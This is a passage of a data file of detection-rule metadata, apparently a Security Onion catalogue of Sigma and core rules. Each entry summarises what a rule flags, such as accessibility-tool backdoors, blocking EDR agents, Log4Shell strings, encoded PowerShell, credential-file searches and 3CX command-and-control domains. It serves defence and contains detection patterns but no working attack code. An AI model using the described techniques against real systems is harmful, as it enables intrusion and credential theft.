    lockouts. Dsacls.exe is a command-line tool used for managing permissions on Active
    Directory objects. The rule identifies suspicious activity by looking for specific
    command-line parameters, such as "/user:" and "/passwd:", which indicate the use
    of a username and password, potentially to attempt multiple logins. The need for
    this detection stems from the abuse of Dsacls.exe to stealthily perform unauthorized
    access attempts within an Active Directory.
  Updated-Date: '2024_09_04'
baca5663-583c-45f9-b5dc-ea96a22ce542:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 836c547ca5e1dee35a8bfebcb0ba3af4
  Ruleset: core
  Summary: This rule detects the usage and installation of a backdoor that leverages
    the registry to register a malicious debugger for built-in Windows accessibility
    tools accessible from the login screen. Such modifications to the registry suggest
    an attempt at privilege escalation and persistence by compromising commonly used
    executables like 'sethc.exe' (Sticky Keys), 'utilman.exe' (Ease of Access), 'osk.exe'
    (On-Screen Keyboard), among others. The aim is to monitor for any suspicious registrations
    that could indicate unauthorized access or control over these executables, posing
    a significant security risk.
  Updated-Date: '2024_09_03'
bacf58c6-e199-4040-a94f-95dea0f1e45a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8246e3cf100704f4b180885ae97ea1ac
  Ruleset: sigmahq
  Summary: This rule detects events where the Windows Filtering Platform (WFP) blocks
    connections from binaries associated with common Endpoint Detection and Response
    (EDR) agents. Adversaries might employ WFP filters to obstruct EDR agents, inhibiting
    them from reporting security events. Potentially blocked binaries include those
    from Cybereason, Carbon Black EDR, TrendMicro Apex One, CrowdStrike Falcon, Cylance,
    Palo Alto Networks Traps/Cortex XDR, ESET Inspect, Elastic EDR, FortiEDR, Sophos
    EDR, Harfanglab EDR, SentinelOne, Microsoft Defender for Endpoint, Qualys EDR,
    Carbon Black Cloud, Cisco Secure Endpoint, and Tanium. This threat scenario represents
    a defense evasion tactic with a high level of severity.
  Updated-Date: '2024_09_04'
bae2865c-5565-470d-b505-9496c87d0c30:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a9d218bc906238f2b91e41b4e603b1c7
  Ruleset: sigmahq
  Summary: This rule detects the use of the spoolss named pipe over SMB, which can
    be utilized to trigger NTLM authentication on any machine with the spoolservice
    enabled. This activity is associated with lateral movement techniques within a
    network.
  Updated-Date: '2024_09_04'
baecf8fb-edbf-429f-9ade-31fc3f22b970:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 263780a4d889bbd434abebf74065c942
  Ruleset: sigmahq
  Summary: This rule detects the modification of autostart extensibility points (ASEP)
    in the registry for Microsoft Office applications. These modifications can indicate
    potential persistence mechanisms employed by malware. The detection criteria include
    changes to registry paths associated with various Office add-ins, such as Word,
    Excel, Outlook, PowerPoint, OneNote, and Access. It filters out known legitimate
    add-ins and common installation processes to minimize false positives. The rule
    is designed to catch suspicious registry activities that might not be part of
    standard Office operations or authorized administrator actions.
  Updated-Date: '2024_09_04'
baef1ec6-2ca9-47a3-97cc-4cf2bda10b77:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b6949f96798d493744a8fdad8f94b080
  Ruleset: core
  Summary: This rule detects attempts to add a new network provider through the command
    line, which may be an indicator of a credential dumping attempt. This technique
    resembles the behavior of the NPPSpy tool, which targets Windows systems to extract
    clear text credentials. The detection focuses on command line activities that
    involve modifications in the system's network provider settings, particularly
    in the registry path specified. Legitimate network providers that are not filtered
    in this rule may also trigger detections.
  Updated-Date: '2024_09_03'
bafac3d6-7de9-4dd9-8874-4a1194b493ed:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 44a35a7c18b3f41c02f1342f458185b9
  Ruleset: sigmahq
  Summary: This rule detects the misuse of the print.exe utility on Windows systems
    for remote file copying, a technique that attackers might use for defense evasion.
    It focuses on process creation events where the print.exe executable is invoked
    with specific command-line arguments indicating the intent to print files to a
    remote location. The rule helps identify potentially malicious usage patterns
    by monitoring for certain command line structures, while filtering out benign
    instances of the same binary.
  Updated-Date: '2024_09_04'
bb09dd3e-2b78-4819-8e35-a7c1b874e449:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88db16363ab17fc32370ba9433896165
  Ruleset: core
  Summary: This rule detects the presence and execution of Inveigh, a penetration
    testing tool used for network-based attacks mimicking the features of Responder,
    by identifying specific artefacts such as log files and executable files. The
    artefacts include file names like `Inveigh-Log.txt`, `Inveigh-Cleartext.txt`,
    `Inveigh-NTLMv1Users.txt`, `Inveigh-NTLMv2Users.txt`, `Inveigh-NTLMv1.txt`, `Inveigh-NTLMv2.txt`,
    `Inveigh-FormInput.txt`, `Inveigh.dll`, `Inveigh.exe`, `Inveigh.ps1`, and `Inveigh-Relay.ps1`.
    Detection of these artefacts indicates potential use of Inveigh for conducting
    man-in-the-middle attacks, credential capturing, or other network reconnaissance
    activities in Windows environments. The likelihood of false positives is considered
    to be low.
  Updated-Date: '2024_09_03'
bb0e9cec-d4da-46f5-997f-22efc59f3dca:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d6575ade42f99965f6580d616925c03a
  Ruleset: core
  Summary: This rule detects potential JNDI Injection exploitation within JVM-based
    applications. It looks for specific keywords like 'com.sun.jndi.ldap.' and 'org.apache.logging.log4j.core.net.JndiManager'
    in application error logs, which could indicate an attempt to exploit vulnerabilities
    such as Log4Shell. This type of exploit can be used for initial access by attackers
    and is considered high risk.
  Updated-Date: '2024_09_03'
bb2ba6fb-95d4-4a25-89fc-30bb736c021a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 17925d456b68e9b2f46efb7863ba41a7
  Ruleset: sigmahq
  Summary: This rule detects the loading of PowerShell Core DLL files by Microsoft
    Office applications such as Excel, Publisher, Outlook, OneNote, PowerPoint, and
    Word. This behavior is potentially indicative of defense evasion tactics, where
    an attacker uses a familiar and trusted application to execute malicious PowerShell
    commands. The detection focuses on the presence of specific DLL files, namely
    `System.Management.Automation.Dll` and its variants, being loaded by these Office
    products.
  Updated-Date: '2024_09_04'
bb382fd5-b454-47ea-a264-1828e4c766d6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99317294aa42bac4d140eb29383027d4
  Ruleset: sigmahq
  Summary: This rule detects the use of the "apt" and "apt-get" commands to execute
    a shell or proxy commands on Linux systems. Such activity may indicate attempts
    at privilege escalation, unauthorized command execution, or efforts to escape
    from restricted environments.
  Updated-Date: '2024_09_04'
bb58aa4a-b80b-415a-a2c0-2f65a4c81009:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b6efcc084f56d5b4276c8a070ded508
  Ruleset: core
  Summary: This rule detects the suspicious execution of the Microsoft desktop image
    downloader utility, "desktopimgdownldr," with specific parameters indicating an
    attempt to download files from the Internet. The rule identifies this behavior
    by monitoring command lines for the presence of the "/lockscreenurl:" parameter.
    It further refines the detection to exclude common image file extensions such
    as .jpg, .jpeg, and .png. Additionally, the rule checks for commands attempting
    to delete registry entries related to the PersonalizationCSP. This type of activity
    is associated with command and control techniques, and is indicative of a potential
    unauthorized or malicious file download and subsequent actions designed to alter
    system personalization settings.
  Updated-Date: '2024_09_03'
bb76d96b-821c-47cf-944b-7ce377864492:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a8392977302bd4da2b2c2c26ccefff28
  Ruleset: core
  Summary: This rule detects a privilege elevation attempt by coercing NTLM authentication
    on the Printer Spooler service. It involves monitoring for the execution of 'rundll32.exe'
    with specific command line parameters that indicate exploitation through the 'davclnt.dll'
    for setting cookies related to HTTP requests. This activity is indicative of an
    attempt to abuse the Printer Spooler service, specifically targeting certain components
    like 'spoolss', 'srvsvc', and '/print/pipe/'. This method of exploitation is often
    associated with attempts to gain elevated privileges and unauthorized credential
    access on Windows systems. The intent behind this detection is to identify and
    mitigate risks associated with such malicious activities.
  Updated-Date: '2024_09_03'
bb780e0c-16cf-4383-8383-1e5471db6cf9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d2b3572a4c67855d13d6cfdb6a9aa06
  Ruleset: sigmahq
  Summary: This rule detects the presence of a potentially XOR encoded PowerShell
    command, which may indicate malicious activity. It focuses on observations of
    command lines that include specific patterns and keywords related to XOR operations
    commonly used in various forms of obfuscation and encoding. These include terms
    such as 'bxor', 'ForEach', and '-join', among others. The rule is triggered by
    processes created by PowerShell or PowerShell Core, considering filenames, descriptions,
    and product identifiers associated with these tools. The potential use of XOR
    encoding in PowerShell commands could be an attempt by attackers to evade defenses
    and execute malicious scripts covertly.
  Updated-Date: '2024_09_04'
bba1a299-eff6-4ca6-bc9e-f858c785c89f:
  Created-Date: '2024_09_25'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d1686c4e604bf805ac2d326f445a42ca
  Ruleset: securityonion-resources
  Summary: This rule detects when the Security Onion grid has returned to a healthy
    state, signifying that the system has recovered from any previous issues and is
    functioning correctly. This notification helps administrators confirm the operational
    status of the Security Onion grid, ensuring that all components are running as
    expected and the environment is secure and stable.
  Updated-Date: '2024_09_25'
bbb2dedd-a0e3-46ab-ba6c-6c82ae7a9aa7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b2c81525b7be37b2d344f8b8dbeb805
  Ruleset: emerging-threats
  Summary: This rule detects activities indicative of HAFNIUM group exploitation on
    Microsoft Exchange servers. Specific behaviors monitored include the use of the
    'attrib' command to hide, system, read-only, and .aspx files, as well as command
    executions involving 'ProgramData\VSPerfMon\' directory, and tasks related to
    'VSPerfMon'. It also looks for unusual instances of the Opera browser, 'vssadmin'
    listing shadow copies with output to a temporary directory, and 'makecab' compression
    activities within 'inetpub\wwwroot' and Exchange Server directories. Additionally,
    it watches for '7-Zip' command usage related to a specific directory path, 'rundll32'
    commands invoking 'comsvcs.dll' for minidumps involving the 'inetpub\wwwroot'
    directory, and miscellaneous commands related to temporary directories and executable
    files. These patterns collectively suggest suspicious or malicious activities
    associated with HAFNIUM exploitation tactics.
  Updated-Date: '2024_09_03'
bbb7e38c-0b41-4a11-b306-d2a457b7ac2b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95100d972d9356c96c5fba7fc63dab95
  Ruleset: sigmahq
  Summary: This rule detects the creation of suspicious files with specific extensions
    within the "C:\PerfLogs\" directory on a Windows system. The directory typically
    contains ".etl" files, and the presence of files with extensions such as ".7z,"
    ".bat," ".bin," ".chm," ".dll," ".exe," ".hta," ".lnk," ".ps1," ".psm1," ".py,"
    ".scr," ".sys," ".vbe," ".vbs," or ".zip" can indicate potentially malicious activity.
  Updated-Date: '2024_09_04'
bbb80e91-5746-4fbe-8898-122e2cafdbf4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5dfcf35a292ad9ed56361aeb8d07222
  Ruleset: core
  Summary: This rule detects suspicious PowerShell invocation command parameters.
    It identifies encoded commands using flags such as '-enc', '-EncodedCommand',
    and '-ec'. It also flags commands intended to operate in a hidden window, detected
    through parameters like '-w hidden', '-window hidden', '-windowstyle hidden',
    and '-w 1'. Additionally, it recognizes non-interactive PowerShell executions
    with parameters such as '-noni' and '-noninteractive'. The detection of these
    parameters indicates potentially malicious or stealthy PowerShell activities.
  Updated-Date: '2024_09_03'
bbc865e4-7fcd-45a6-8ff1-95ced28ec5b2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3a7f2752559ecc37f598fe0a9eb2f989
  Ruleset: core
  Summary: This rule detects commands that redirect the content of the `ntdll.dll`
    file to a different file or a pipe. This activity is typically performed to evade
    detection by antivirus (AV) or endpoint detection and response (EDR) systems.
    The specific commands involve typing the `ntdll.dll` file located in the `system32`
    directory and piping its content to another location. This technique has been
    observed in the Proof of Concept (POC) known as NtdllPipe.
  Updated-Date: '2024_09_03'
bbf59793-6efb-4fa1-95ca-a7d288e52c88:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 449609299bb1ccf56c8b8fbce1891d5c
  Ruleset: core
  Summary: This rule detects the abuse of the Winlogon Notify registry key for persistence
    by adversaries. Winlogon.exe, a critical Windows component managing logon/logoff
    operations and the secure attention sequence (Ctrl-Alt-Delete), can be exploited
    to execute DLLs or other executables during user logon. The detection focuses
    on specific modifications to registry keys associated with Winlogon and DLL file
    endings.
  Updated-Date: '2024_09_03'
bc275be9-0bec-4d77-8c8f-281a2df6710f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ae05f51889ae8abba43b5060541d64f1
  Ruleset: core
  Summary: This rule detects the disabling of the Windows Defender feature for scanning
    malware and potentially unwanted applications (PUA) by monitoring for EventID
    5010. Disabling this feature could indicate an attempt at defense evasion, exposing
    the system to malicious attacks. The rule helps to identify potentially dangerous
    configurations or alterations in the antivirus settings, thereby helping to maintain
    robust system protection.
  Updated-Date: '2024_09_03'
bc2e25ed-b92b-4daa-b074-b502bdd1982b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 96758718ccd81445c0deb258f8a38fa4
  Ruleset: core
  Summary: This rule detects the invocation of TabTip via Class ID (CLSID), a behavior
    observed when the JuicyPotatoNG tool is used on a system in brute force mode.
    Specifically, it identifies when the Distributed Component Object Model (DCOM)
    server associated with TabTip.exe is started or attempted to be started, which
    is indicative of a local privilege escalation attempt. The monitoring focuses
    on Windows system logs capturing event ID 10001 with particular parameters related
    to the execution path of TabTip, the error code, and the associated DCOM server
    ID.
  Updated-Date: '2024_09_03'
bc309b7a-3c29-4937-a4a3-e232473f9168:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1009d5912508d09d6f43d37d2a3c766
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the Qakbot uninstaller file, specifically
    the one mentioned in the USAO-CDCA document concerning the disruption of the Qakbot
    malware and botnet. The detection criteria include the file name ending with '\QbotUninstall.exe'
    and specific hash values associated with this uninstaller file. The intent is
    to identify the removal process of the Qakbot malware, a notorious piece of malware
    used in various cybercriminal activities.
  Updated-Date: '2024_09_03'
bc3a4b0c-e167-48e1-aa88-b3020950e560:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fb4e2a78bb319764172de1ef856f3533
  Ruleset: core
  Summary: This rule detects remote RPC calls that potentially abuse the remote printing
    service through MS-RPRN or MS-PAR protocols, which can be indicative of lateral
    movement within a network. It leverages specific Interface UUIDs to identify suspicious
    activities that may exploit vulnerabilities, such as CVE-2021-34527, to compromise
    systems. This detection mechanism is integrated with the RPC Firewall, examining
    events from the firewall logs to spot malicious remote printing attempts. It aims
    to prevent unauthorized lateral movement by blocking these RPC calls while maintaining
    an audit trail for analysis.
  Updated-Date: '2024_09_03'
bc92ca75-cd42-4d61-9a37-9d5aa259c88b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9ad8b1ee6bd3d1a539caa6c9e82adf66
  Ruleset: core
  Summary: This rule detects the restoration of files from Microsoft Defender's quarantine.
    The detection is triggered by a specific event associated with the antimalware
    platform when it restores an item from quarantine, signifying potential defense
    evasion.
  Updated-Date: '2024_09_03'
bcc6f179-11cd-4111-a9a6-0fab68515cf7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 49cea8b5e12f0d0932e068c402f9ec07
  Ruleset: emerging-threats
  Summary: This rule detects process execution patterns associated with Griffon malware,
    as disclosed by Kaspersky. Griffon is a sophisticated cybercrime tool attributed
    to the notorious FIN7 group. The detection focuses on specific command lines that
    involve activities such as accessing the local temporary directory, executing
    JScript commands, and handling text files. The execution pattern identified is
    critical, with false positives deemed unlikely. This rule is relevant for monitoring
    on Windows systems to identify potential Griffon malware activity.
  Updated-Date: '2024_09_03'
bcd95697-e3e7-4c6f-8584-8e3503e6929f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9f4ae5d9d04ebea3b80760a4090d4ae6
  Ruleset: emerging-threats
  Summary: This rule detects suspicious file creations within the parent telemetry
    folder of Palo Alto Networks PAN-OS, particularly those that are processed by
    the vulnerable 'dt_curl' script if device telemetry is enabled. The script in
    question can inadvertently enable arbitrary command execution via filenames that
    exploit its shell-subprocess overriding capability, posing a security risk. Key
    indicators include filenames containing specific strings like '{IFS}', 'base64',
    'bash', 'curl', and 'http', starting with the directory path '/opt/panlogs/tmp/device_telemetry/'.
  Updated-Date: '2024_09_03'
bcfcc962-0e4a-4fd9-84bb-a833e672df3f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 050be1f4aacaa9a151ecc99ac7cd923d
  Ruleset: sigmahq
  Summary: This rule detects when a Virtual Network in Azure is either modified or
    deleted. It triggers upon recognizing specific operation names related to Virtual
    Network Gateways and Virtual Networks that end with WRITE or DELETE actions. Potential
    false positives may occur when legitimate modifications or deletions are carried
    out by system administrators, and such activities should be verified based on
    the user identity, user agent, and hostname to determine whether the modifications
    are authorized and expected.
  Updated-Date: '2024_09_04'
bd03a0dc-5d93-49eb-b2e8-2dfd268600f8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4bccda707aa0e27226dd947ba5167458
  Ruleset: emerging-threats
  Summary: This rule detects potential beaconing activity to domains associated with
    a compromise of the 3CX 3CXDesktopApp. It specifically monitors DNS queries that
    include domain names linked to suspicious activities, such as 'akamaicontainer.com',
    'azureonlinecloud.com', 'msedgeupdate.net', and 'officestoragebox.com'. The detection
    focuses on identifying these domain names in DNS queries to flag potential communication
    between compromised 3CXDesktopApp installations and command-and-control servers.
    The rule aims to identify malicious traffic indicative of the 3CXDesktopApp being
    compromised for unauthorized access or data exfiltration.
  Updated-Date: '2024_09_03'
bd1212e5-78da-431e-95fa-c58e3237a8e6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 128b54834b75f7bd0d25a1b6f12d73e6
  Ruleset: core
  Summary: This rule detects the dropping of suspicious ASPX, ASP, or ASHX files by
    an Exchange component, specifically the w3wp.exe process, into unusual directories
    such as "FrontEnd\HttpProxy\" and "\inetpub\wwwroot\aspnet_client\". This activity
    could indicate exploitation attempts leveraging vulnerabilities in Microsoft Exchange
    Server, specifically CVE-2022-41040 and CVE-2022-41082.
  Updated-Date: '2024_09_03'
bd132164-884a-48f1-aa2d-c6d646b04c69:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75e272b58bc3ee183a4dbd7fdbf43c1d
  Ruleset: sigmahq
  Summary: This rule detects potential ransomware activity in Microsoft 365 by identifying
    when Microsoft Cloud App Security reports that a user uploads files to the cloud
    that may be infected with ransomware.
  Updated-Date: '2024_09_04'
bd1c6866-65fc-44b2-be51-5588fcff82b9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 85db3c61931a82a3b0da430ace4f5c36
  Ruleset: core
  Summary: This rule detects the execution of a renamed "Msdt.exe" binary, which is
    commonly associated with defense evasion tactics. The detected activity involves
    a process creation event on Windows systems where Msdt.exe is being executed under
    a different file name. This can be indicative of malicious attempts to disguise
    the execution of this diagnostic tool for nefarious purposes.
  Updated-Date: '2024_09_03'
bd33d2aa-497e-4651-9893-5c5364646595:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05967f586fe5fe7bf41173182868dda9
  Ruleset: sigmahq
  Summary: This rule detects PowerShell scripts that create sockets or listeners,
    indicative of potential tunneling activity. It identifies scripts containing specific
    terms such as '[System.Net.HttpWebRequest]', 'System.Net.Sockets.TcpListener',
    and 'AcceptTcpClient', which are associated with establishing a TCP tunnel via
    PowerShell. The rule aims to uncover command-and-control traffic, commonly seen
    in attack techniques.
  Updated-Date: '2024_09_04'
bd5971a7-626d-46ab-8176-ed643f694f68:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 54d196ec7cb28685905cb1e14f89adda
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell to search local file systems and
    remote file shares for files that may store insecurely kept credentials. Adversaries
    can locate files created by users for their own credentials, group-shared credential
    stores, configuration files with system or service passwords, or source code and
    binary files with embedded passwords. The detection focuses on specific PowerShell
    command patterns like "ls", " -R", "select-string", and "-Pattern".
  Updated-Date: '2024_09_04'
bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ceeeb937252445b4e31d74519b3f70c8
  Ruleset: emerging-threats
  Summary: This rule detects potential malicious activity associated with the Advanced
    Persistent Threat group APT-C-12, specifically focusing on the BlueMushroom malware.
    The detection centers on the use of the regsvr32 utility to load DLL files from
    the AppData Local directory, which is indicative of an attempt by BlueMushroom
    to execute its payload. The presence of this activity may suggest an evasion technique
    being employed to manipulate legitimate Windows processes for executing malicious
    code.
  Updated-Date: '2024_09_03'
bd8b828d-0dca-48e1-8a63-8a58ecf2644f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3f379391524a208946bf7d6414990971
  Ruleset: sigmahq
  Summary: This rule detects the execution of whoami.exe with the /groups command
    line flag, which is used to display group membership details for the current user.
    It provides information such as the group memberships, account type, security
    identifiers (SID), and associated attributes.
  Updated-Date: '2024_09_04'
bdbab15a-3826-48fa-a1b7-723cd8f32fcc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a71beff5320138382169a67cf9839f27
  Ruleset: emerging-threats
  Summary: This rule detects the "GoogleUpdate.exe" process spawning a new instance
    of itself in an uncommon location. This behavior is potentially associated with
    the Goofy Guineapig backdoor, which is a type of malware. The rule monitors for
    instances where "GoogleUpdate.exe" is executed from paths outside the typical
    directories such as "C:\Program Files\Google\", "C:\Program Files (x86)\Google\",
    or "\AppData\Local\Google\Update\". Detecting this anomaly can help identify unauthorized
    or malicious usage of the "GoogleUpdate.exe" process.
  Updated-Date: '2024_09_03'
bdc64095-d59a-42a2-8588-71fd9c9d9abc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bf68db70a0bbb060ed628232f3b02e1a
  Ruleset: core
  Summary: This rule detects the loading of the dbghelp.dll or dbgcore.dll files,
    which are unsigned and used for making memory dumps, by suspicious processes.
    Such DLLs are leveraged by various tools like ProcessHacker and certain malicious
    techniques, including the SilentTrynity C2 Framework, which uses the MiniDumpWriteDump
    API to dump the contents of Lsass.exe and transfer the dump over the network to
    an attacker's machine.
  Updated-Date: '2024_09_03'
bdd8157d-8e85-4397-bb82-f06cc9c71dbb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7e3969b85b3f9e2a0e311754238a854
  Ruleset: core
  Summary: This rule detects the usage of IEInstal.exe, a legitimate file found in
    the Internet Explorer folder, as part of a technique to bypass User Account Control
    (UAC) on Windows systems. The detection criteria focus on instances where IEInstal.exe
    targets specific patterns of filenames typically associated with temporary user
    files and consent.exe execution, which indicates an attempt to escalate privileges.
    The rule is connected to defense evasion and privilege escalation tactics used
    by malware such as UACMe, which exploits legitimate software to circumvent security
    measures.
  Updated-Date: '2024_09_03'
bde30855-5c53-4c18-ae90-1ff79ebc9578:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed64b2f37b9f881a2fed42cd2f717540
  Ruleset: core
  Summary: This rule detects when an Okta user session starts and the user is behind
    an anonymizing proxy service. The detection focuses on events where the session
    initiation indicates the use of a proxy service, flagging potential instances
    of defense evasion.
  Updated-Date: '2024_09_03'
bde47d4b-9987-405c-94c7-b080410e8ea7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a6a41a8f18a2b5582262704b798c4ac1
  Ruleset: core
  Summary: This rule detects when a user attempts to clear the console history on
    a Windows system. Clearing command history is a technique that adversaries may
    use to hide their activities on a compromised account. It identifies these actions
    by monitoring for specific PowerShell commands, such as `Clear-History` and actions
    involving the removal of items related to console history files like `ConsoleHost_history.txt`
    and `(Get-PSReadlineOption).HistorySavePath`.
  Updated-Date: '2024_09_03'
bdeb2cff-af74-4094-8426-724dc937f20a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f63f3b62c3c83e81d3254b468e129f19
  Ruleset: core
  Summary: This rule detects the execution of PowerShell commands aimed at modifying
    the Access Control List (ACL) of a file or folder. By identifying specific command-line
    patterns that include "Set-Acl", "-AclObject", and "-Path", it targets activities
    intended to change file or directory permissions. Monitoring such actions is crucial
    as they can indicate attempts to evade defenses or gain unauthorized access.
  Updated-Date: '2024_09_03'
bdeeabc9-ff2a-4a51-be59-bb253aac7891:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f0578b8d80d3e7eb90098b80f5793c39
  Ruleset: core
  Summary: This rule detects the usage of wsudo (Windows Sudo Utility), a tool that
    allows users to execute programs with different permissions such as System, Trusted
    Installer, and Administrator. By monitoring process creation events where the
    executable's image or parent image matches 'wsudo.exe' or 'wsudo-bridge.exe',
    respectively, and the command line contains specific strings indicating a change
    in user privileges, this rule can identify potential unauthorized attempts to
    gain elevated permissions on a Windows system.
  Updated-Date: '2024_09_03'
be344333-921d-4c4d-8bb8-e584cf584780:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e6a1a64447594054c685ae7f3a874a6
  Ruleset: core
  Summary: This rule detects uncommon or suspicious child processes that are spawned
    by "eventvwr.exe," which might suggest an attempt to bypass User Account Control
    (UAC). Event Viewer (eventvwr.exe) is a legitimate Windows application, but it
    can be exploited to escalate privileges through registry hijacking, as detailed
    in known cases of fileless UAC bypass. The detection filters out expected applications
    like "mmc.exe" and "WerFault.exe" to reduce false positives, focusing on other
    unexpected or unusual child processes.
  Updated-Date: '2024_09_03'
be4d9c86-d702-4030-b52e-c7859110e5e8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f9f483b825d01b439a3c5cc91fbcdba2
  Ruleset: core
  Summary: This rule detects user activity originating from an IP address identified
    as an anonymous proxy. This may indicate a potential threat as it involves the
    use of anonymous IP addresses, often associated with attempts to evade detection,
    maintain persistence, or escalate privileges.
  Updated-Date: '2024_09_03'
be58d2e2-06c8-4f58-b666-b99f6dc3b6cd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e456dbeaa183ea5678b305e7ff82b23c
  Ruleset: sigmahq
  Summary: This rule detects a suspicious process attempting to masquerade as the
    legitimate "svchost.exe" by naming its binary "svchost.exe" and running from an
    unusual location. Adversaries use this technique to disguise malicious activity
    by mimicking well-known system processes like "svchost.exe" in order to evade
    detection. The rule scrutinizes process creation events and flags those where
    "svchost.exe" is executed from locations other than the typical system directories,
    specifically "C:\Windows\System32" and "C:\Windows\SysWOW64". This method helps
    in identifying potentially malicious binaries that are impersonating legitimate
    Windows processes.
  Updated-Date: '2024_09_04'
beaa66d6-aa1b-4e3c-80f5-e0145369bfaf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1b1e517e0420198d382e63ba1c5bb4f9
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious activities involving the execution
    of various log query utilities and commands to search or extract content from
    specific event logs or to look for particular event IDs. Threat actors utilize
    these techniques to gather sensitive information from event logs, such as usernames,
    IP addresses, and hostnames. The detection covers various utilities, including
    WMI, `wevtutil`, and `wmic`, as well as specific PowerShell cmdlets like `Get-WinEvent`
    and `get-eventlog`. The rule targets event logs that are likely of interest to
    attackers, including those related to PowerShell, security auditing, terminal
    services, and Windows Defender. It also focuses on certain event IDs that may
    contain critical information, such as logon events or session management events.
    While legitimate administrative activities can trigger these detections, the primary
    focus is to identify unauthorized or malignant reconnaissance efforts.
  Updated-Date: '2024_09_04'
bed2a484-9348-4143-8a8a-b801c979301c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: becb1fd2ef05823d8dccbe00c3066518
  Ruleset: core
  Summary: This rule detects reconnaissance activity via web shells by identifying
    suspicious command line parameters often used by web servers. It monitors processes
    stemming from web server images such as `w3wp.exe`, `php-cgi.exe`, `nginx.exe`,
    `httpd.exe`, `caddy.exe`, and `ws_tomcatservice.exe`, specifically looking for
    `java.exe` and `javaw.exe` associated with Tomcat servers. Suspicious usage of
    network utility tools like `net.exe` and `net1.exe` that include keywords such
    as "user", "use", and "group" are flagged. It also detects abnormal command line
    usages of `ping.exe`, suspicious directory change commands, and the use of `wmic.exe`
    with nodes specified. Furthermore, the rule checks for common discovery binaries
    like `dsquery.exe`, `ipconfig.exe`, `netstat.exe`, `nslookup.exe`, `pathping.exe`,
    among others, and scrutinizes their command line arguments for potential malicious
    activity.
  Updated-Date: '2024_09_03'
bed978f8-7f3a-432b-82c5-9286a9b3031a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
